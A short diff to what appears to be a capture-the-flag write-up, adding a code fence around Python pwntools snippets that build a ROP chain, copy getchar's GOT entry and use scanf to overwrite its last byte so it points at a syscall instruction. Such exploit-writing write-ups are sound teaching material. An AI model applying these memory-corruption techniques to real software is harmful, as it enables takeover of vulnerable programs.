@@ -87,6 +87,7 @@ def move8(dst, src):  # must begin rop at pop rbp; ret
 move8(POINTER, context.binary.got['getchar'])
 ```
 Then, I used `scanf("%hhd")` to overwrite the last byte of `getchar()` to point to a syscall instruction:
+```python
 def scanf(*args): R.call(context.binary.sym.__isoc99_scanf, args)
 FORMAT_LINE = 0x4012f0 # pointer to "[^\n]" in the binary
 FORMAT_CHAR = POINTER+8 # pointer to "%hhd", which will be written later
